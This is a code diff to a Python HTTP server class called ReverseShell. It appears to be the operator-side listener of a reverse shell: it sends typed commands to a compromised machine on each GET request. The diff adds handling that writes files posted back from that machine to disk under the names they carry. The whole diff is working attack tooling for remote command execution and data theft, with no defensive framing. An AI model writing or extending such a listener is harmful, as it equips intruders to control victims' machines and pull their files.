@@ -8,7 +8,9 @@ PORT = 8080
 
 class ReverseShell(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
+
         command = input(Fore.YELLOW + ">> ")
+
         print(Style.RESET_ALL)
 
         # boilerplate http
@@ -27,8 +29,14 @@ class ReverseShell(http.server.BaseHTTPRequestHandler):
 
         # Read post then print the posted data
         postVar = self.rfile.read(length).decode()
-        print(Fore.GREEN + postVar, end='')
-        print(Style.RESET_ALL)
+        file_loc = postVar.find("filename")
+        if file_loc != -1:
+            filename = postVar[file_loc+8:].split('"')[1]
+
+            with open(filename, "+w") as f:
+                f.write(postVar)
+        # print(Fore.GREEN + postVar, end='')
+        # print(Style.RESET_ALL)
 
 
 with socketserver.TCPServer(("", PORT), ReverseShell) as httpd:
